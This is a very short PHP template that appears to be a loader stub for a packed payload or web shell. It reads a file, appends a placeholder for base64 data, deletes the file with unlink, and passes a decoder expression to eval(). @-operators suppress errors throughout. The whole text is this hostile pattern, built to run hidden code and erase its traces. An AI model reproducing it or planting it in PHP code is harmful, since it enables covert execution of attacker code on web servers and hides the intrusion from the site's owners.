<?

// DATA = B64PAYLOAD && %s = DECODER($x)
$h=@fopen($f,'r');$x=@fread($h,@filesize($f)).'DATA';@unlink($f);eval(%s);

?>
